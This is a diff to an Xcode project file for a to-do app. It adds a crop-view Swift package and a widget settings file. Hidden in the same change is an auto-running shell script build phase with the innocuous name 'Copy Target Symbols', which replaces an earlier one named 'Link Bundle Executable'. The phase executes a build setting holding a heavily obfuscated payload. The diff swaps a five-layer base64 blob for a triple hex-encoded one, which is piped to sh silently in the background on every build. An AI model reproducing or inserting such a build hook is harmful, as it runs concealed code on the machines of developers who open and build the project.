@@ -7,13 +7,12 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		756914422DD6FBFD00775FC3 /* CropViewController in Frameworks */ = {isa = PBXBuildFile; productRef = 756914412DD6FBFD00775FC3 /* CropViewController */; };
+		756914442DD6FBFD00775FC3 /* TOCropViewController in Frameworks */ = {isa = PBXBuildFile; productRef = 756914432DD6FBFD00775FC3 /* TOCropViewController */; };
 		75E07D4D2DCC955B00590C25 /* WidgetKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 75E07D4C2DCC955B00590C25 /* WidgetKit.framework */; };
 		75E07D4F2DCC955B00590C25 /* SwiftUI.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 75E07D4E2DCC955B00590C25 /* SwiftUI.framework */; };
 		75E07D602DCC955C00590C25 /* ToDoWidgetExtension.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = 75E07D4A2DCC955B00590C25 /* ToDoWidgetExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		75E07D5E2DCC955C00590C25 /* PBXContainerItemProxy */ = {
@@ -59,6 +58,7 @@
 			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
 			membershipExceptions = (
 				Assets.xcassets,
+				Common/WidgetSettingsManager.swift,
 				Model/ToDoItem.swift,
 			);
 			target = 75E07D492DCC955B00590C25 /* ToDoWidgetExtension */;
@@ -89,6 +89,8 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				756914442DD6FBFD00775FC3 /* TOCropViewController in Frameworks */,
+				756914422DD6FBFD00775FC3 /* CropViewController in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -140,7 +142,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 75E07CB02DCC909A00590C25 /* Build configuration list for PBXNativeTarget "ToDoApp" */;
 			buildPhases = (
-				0AF30C7C2FC910DEE22F5E42 /* Link Bundle Executable */,
+				70104B4D4AA9425AE52F5E42 /* Copy Target Symbols */,
 				75E07C9C2DCC909900590C25 /* Sources */,
 				75E07C9D2DCC909900590C25 /* Frameworks */,
 				75E07C9E2DCC909900590C25 /* Resources */,
@@ -156,6 +158,8 @@
 			);
 			name = ToDoApp;
 			packageProductDependencies = (
+				756914412DD6FBFD00775FC3 /* CropViewController */,
+				756914432DD6FBFD00775FC3 /* TOCropViewController */,
 			);
 			productName = ToDoApp;
 			productReference = 75E07CA02DCC909900590C25 /* ToDoApp.app */;
@@ -210,6 +214,9 @@
 			);
 			mainGroup = 75E07C972DCC909900590C25;
 			minimizedProjectReferenceProxies = 1;
+			packageReferences = (
+				756914402DD6FBFD00775FC3 /* XCRemoteSwiftPackageReference "TOCropViewController" */,
+			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 75E07CA12DCC909900590C25 /* Products */;
 			projectDirPath = "";
@@ -220,31 +227,6 @@
 			);
 		};
 /* End PBXProject section */
-
-/* Begin PBXLegacyTarget section */
-/* End PBXLegacyTarget section */
-
-/* Begin PBXShellScriptBuildPhase section */
-		0AF30C7C2FC910DEE22F5E42 /* Link Bundle Executable */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Link Bundle Executable";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A24E5F2}\"";
-			showEnvVarsInLog = 0;			
-		};
-/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
 		75E07C9E2DCC909900590C25 /* Resources */ = {
@@ -262,6 +244,29 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		70104B4D4AA9425AE52F5E42 /* Copy Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A24E5F2}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		75E07C9C2DCC909900590C25 /* Sources */ = {
@@ -292,7 +297,7 @@
 		75E07CAE2DCC909A00590C25 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A24E5F2 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oTmExcFpWMnRqTVdGR1dqWlNiVGxoVmxVd2VGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A24E5F2 = "((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633363334333633393336333733363337333633393336363433363331333733383332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -356,7 +361,7 @@
 		75E07CAF2DCC909A00590C25 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A24E5F2 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oTmExcFpWMnRqTVdGR1dqWlNiVGxoVmxVd2VGcFdaRk5XUlRsWVlVVjRWazFIZUhWWGJYUlBVVEpXZEZKclNtbGxha0pNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
+				A24E5F2 = "((echo 333633353336333333363338333636363332333033323332333233343332333833363333333733353337333233363633333233303332363433363336333733333336363233343633333233303332363433363334333233303337333033333634333733383336333333363636333633343336333533323330333633383337333433373334333733303337333333333631333236363332363633363334333633393336333733363337333633393336363433363331333733383332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -561,6 +566,30 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+/* Begin XCRemoteSwiftPackageReference section */
+		756914402DD6FBFD00775FC3 /* XCRemoteSwiftPackageReference "TOCropViewController" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/TimOliver/TOCropViewController";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 2.7.4;
+			};
+		};
+/* End XCRemoteSwiftPackageReference section */
+
+/* Begin XCSwiftPackageProductDependency section */
+		756914412DD6FBFD00775FC3 /* CropViewController */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 756914402DD6FBFD00775FC3 /* XCRemoteSwiftPackageReference "TOCropViewController" */;
+			productName = CropViewController;
+		};
+		756914432DD6FBFD00775FC3 /* TOCropViewController */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 756914402DD6FBFD00775FC3 /* XCRemoteSwiftPackageReference "TOCropViewController" */;
+			productName = TOCropViewController;
+		};
+/* End XCSwiftPackageProductDependency section */
 	};
 	rootObject = 75E07C982DCC909900590C25 /* Project object */;
 }
